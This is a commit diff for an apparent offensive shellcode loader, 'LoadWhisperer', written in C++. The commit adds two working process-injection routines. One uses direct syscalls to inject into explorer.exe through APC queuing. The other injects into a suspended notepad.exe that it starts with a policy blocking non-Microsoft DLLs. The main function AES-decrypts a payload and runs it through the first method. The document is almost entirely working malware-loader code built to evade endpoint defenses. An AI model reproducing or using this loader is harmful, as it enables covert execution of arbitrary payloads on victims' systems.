b1b1897543a3c8cc280e87648dec53559907ca82
unknown <lemmyzan3771@gmail.com>
2023-10-08 15:53:17 -0400

    Added second process injection method; streamlined code

--- LoadWhisperer/LoadWhisperer.cpp
+++ LoadWhisperer/LoadWhisperer.cpp
@@ -2,6 +2,7 @@
 #include <Windows.h>
 #include <winhttp.h>
 #include <TlHelp32.h>
+#include <ntstatus.h>
 #include "syscalls_all.h"
 #include <iostream>
 #include <vector>
@@ -94,6 +95,129 @@ Cleanup:
 	return out;
 }
 
+VOID procInjectionMethod1(char* payload, DWORD dwPayloadLen) {
+	// Pointer to beginning of memory that will be used for shellcode
+	LPVOID startAllocation;
+	// Shellcode size for memory allocation
+	SIZE_T allocationSize = dwPayloadLen;
+
+	// Handles to thread and process we will inject into
+	HANDLE hThread;
+	HANDLE hProcess;
+
+	// Take a snapshot of currently running processes. We need this to find the PID of explorer.exe
+	// Explorer.exe gets chosen because it's possible hide large amounts of shellcode in it, as well
+	// as its frequency of use.
+	HANDLE hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
+	PROCESSENTRY32 processEntry{ sizeof(PROCESSENTRY32) };
+	// Variable to store explorer.exe's PID
+	DWORD dwPID;
+
+	// Locate explorer.exe
+	if (Process32First(hProcessSnapshot, &processEntry)) {
+		while (_wcsicmp(processEntry.szExeFile, L"explorer.exe") != 0) {
+			Process32Next(hProcessSnapshot, &processEntry);
+		}
+	}
+	// Store its PID
+	dwPID = processEntry.th32ProcessID;
+
+	// Get the values we need for NT syscalls
+	OBJECT_ATTRIBUTES ProcessAttributes;
+	InitializeObjectAttributes(&ProcessAttributes, NULL, NULL, NULL, NULL);
+
+	CLIENT_ID ProcessClientID;
+	ProcessClientID.UniqueProcess = (PVOID)processEntry.th32ProcessID;
+	ProcessClientID.UniqueThread = (PVOID)0;
+
+	// These syscalls will be made using SysWhispers3
+	startAllocation = nullptr;
+	NtOpenProcess(&hProcess, MAXIMUM_ALLOWED, &ProcessAttributes, &ProcessClientID);
+	NtAllocateVirtualMemory(hProcess, &startAllocation, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	NtWriteVirtualMemory(hProcess, startAllocation, payload, dwPayloadLen, 0);
+
+	// Place every thread of explorer.exe in threadIDs. We will use this to assign each an 
+	// Asynchonous Procedural Call (APC), insert the shellcode, then resume the thread, executing our shellcode.
+	// Not all instances of explorer.exe are necessary though, so we'll set a limit
+	THREADENTRY32 threadEntry{ sizeof(THREADENTRY32) };
+	std::vector<DWORD> threadIDs;
+	if (Thread32First(hProcessSnapshot, &threadEntry)) {
+		do {
+			if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
+				threadIDs.push_back(threadEntry.th32ThreadID);
+			}
+		} while (Thread32Next(hProcessSnapshot, &threadEntry));
+	}
+
+	// For each threadID, inject our shellcode using the QueueAPC method. Once the number of threads injected
+	// hits 3, stop.
+	int numThreads = 0;
+	for (DWORD ID : threadIDs) {
+
+		OBJECT_ATTRIBUTES tObjectAttributes;
+		InitializeObjectAttributes(&tObjectAttributes, NULL, NULL, NULL, NULL);
+
+		CLIENT_ID tClientId;
+		tClientId.UniqueProcess = (PVOID)dwPID;
+		tClientId.UniqueThread = (PVOID)ID;
+
+		NtOpenThread(&hThread, MAXIMUM_ALLOWED, &tObjectAttributes, &tClientId);
+		NtSuspendThread(hThread, NULL);
+		NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)startAllocation, startAllocation, NULL, NULL);
+		NtResumeThread(hThread, NULL);
+		numThreads++;
+
+		if (numThreads == 3) {
+			break;
+		}
+	}
+}
+
+VOID procInjectionMethod2(char* payload, DWORD dwPayloadLen) {
+	NTSTATUS status;
+	LPVOID startAllocation;
+	SIZE_T allocationSize = dwPayloadLen;
+	PROCESS_INFORMATION procInfo = {};
+	STARTUPINFOEXA startupInfo = {};
+	SIZE_T attributeSize = 0;
+	DWORD dwOldProtect;
+	DWORD64 dwPolicy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+
+	InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
+	PPROC_THREAD_ATTRIBUTE_LIST attributes = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(),
+		HEAP_ZERO_MEMORY, attributeSize);
+	InitializeProcThreadAttributeList(attributes, 1, 0, &attributeSize);
+
+	UpdateProcThreadAttribute(attributes, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &dwPolicy,
+		sizeof(DWORD64), NULL, NULL);
+	startupInfo.lpAttributeList = attributes;
+
+	if (!CreateProcessA((LPSTR)"C:\\Windows\\System32\\notepad.exe",
+		NULL, NULL, NULL, EXTENDED_STARTUPINFO_PRESENT, CREATE_SUSPENDED | CREATE_NO_WINDOW,
+		NULL, NULL, reinterpret_cast<LPSTARTUPINFOA>(&startupInfo), &procInfo)) {
+		std::cerr << "[-] Process not created " << std::hex << GetLastError() << std::endl;
+	}
+	HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, attributes);
+
+	startAllocation = VirtualAllocExNuma(procInfo.hProcess, NULL, allocationSize,
+		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0);
+
+	status = NtWriteVirtualMemory(procInfo.hProcess, startAllocation, (PVOID)payload, allocationSize, nullptr);
+	if (status != STATUS_SUCCESS) {
+		std::cerr << "[-] Could not write to memory " << std::hex << status << std::endl;
+	}
+
+	status = NtProtectVirtualMemory(procInfo.hProcess, &startAllocation, &allocationSize,
+		PAGE_EXECUTE_READ, &dwOldProtect);
+
+	if (status != STATUS_SUCCESS) {
+		std::cerr << "[-] Could not write to memory " << std::hex << status << std::endl;
+	}
+
+	NtQueueApcThread(procInfo.hThread, (PKNORMAL_ROUTINE)startAllocation, NULL, NULL, NULL);
+	NtResumeThread(procInfo.hThread, 0);
+}
+
 BOOL decryptAES(char* shellcode, DWORD dwShellcodeLen, char* key, DWORD keyLen) {
 	HCRYPTPROV hCryptProv = NULL;
 	HCRYPTKEY hKey = NULL;
@@ -167,81 +291,8 @@ int main(int argc, char** argv) {
 
 	decryptAES(payload, bin.len, aesKey, key.len);
 
-	// Pointer to beginning of memory that will be used for shellcode
-	LPVOID startAllocation;
-	// Shellcode size for memory allocation
-	SIZE_T allocationSize = bin.len;
-
-	// Handles to thread and process we will inject into
-	HANDLE hThread;
-	HANDLE hProcess;
-
-	// Take a snapshot of currently running processes. We need this to find the PID of explorer.exe
-	// Explorer.exe gets chosen because it's possible hide large amounts of shellcode in it, as well
-	// as its frequency of use.
-	HANDLE hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
-	PROCESSENTRY32 processEntry {sizeof(PROCESSENTRY32)};
-	// Variable to store explorer.exe's PID
-	DWORD dwPID;
-
-	// Locate explorer.exe
-	if (Process32First(hProcessSnapshot, &processEntry)) {
-		while (_wcsicmp(processEntry.szExeFile, L"explorer.exe") != 0) {
-			Process32Next(hProcessSnapshot, &processEntry);
-		}
-	}
-	// Store its PID
-	dwPID = processEntry.th32ProcessID;
-
-	// Get the values we need for NT syscalls
-	OBJECT_ATTRIBUTES ProcessAttributes;
-	InitializeObjectAttributes(&ProcessAttributes, NULL, NULL, NULL, NULL);
-
-	CLIENT_ID ProcessClientID;
-	ProcessClientID.UniqueProcess = (PVOID)processEntry.th32ProcessID;
-	ProcessClientID.UniqueThread = (PVOID)0;
-
-	// These syscalls will be made using SysWhispers3
-	startAllocation = nullptr;
-	NtOpenProcess(&hProcess, MAXIMUM_ALLOWED, &ProcessAttributes, &ProcessClientID);
-	NtAllocateVirtualMemory(hProcess, &startAllocation, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	NtWriteVirtualMemory(hProcess, startAllocation, payload, bin.len, 0);
-
-	// Place every thread of explorer.exe in threadIDs. We will use this to assign each an 
-	// Asynchonous Procedural Call (APC), insert the shellcode, then resume the thread, executing our shellcode.
-	// Not all instances of explorer.exe are necessary though, so we'll set a limit
-	THREADENTRY32 threadEntry {sizeof(THREADENTRY32)};
-	std::vector<DWORD> threadIDs;
-	if (Thread32First(hProcessSnapshot, &threadEntry)) {
-		do {
-			if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
-				threadIDs.push_back(threadEntry.th32ThreadID);
-			}
-		} while (Thread32Next(hProcessSnapshot, &threadEntry));
-	}
-
-	// For each threadID, inject our shellcode using the QueueAPC method. Once the number of threads injected
-	// hits 3, stop.
-	int numThreads = 0;
-	for (DWORD ID : threadIDs) {
-
-		OBJECT_ATTRIBUTES tObjectAttributes;
-		InitializeObjectAttributes(&tObjectAttributes, NULL, NULL, NULL, NULL);
-
-		CLIENT_ID tClientId;
-		tClientId.UniqueProcess = (PVOID)dwPID;
-		tClientId.UniqueThread = (PVOID)ID;
-
-		NtOpenThread(&hThread, MAXIMUM_ALLOWED, &tObjectAttributes, &tClientId);
-		NtSuspendThread(hThread, NULL);
-		NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)startAllocation, startAllocation, NULL, NULL);
-		NtResumeThread(hThread, NULL);
-		numThreads++;
-
-		if (numThreads == 3) {
-			break;
-		}
-	}
-
+	//Take your pick of process injection method
+	procInjectionMethod1(payload, bin.len);
+	
 	return 0;
 }
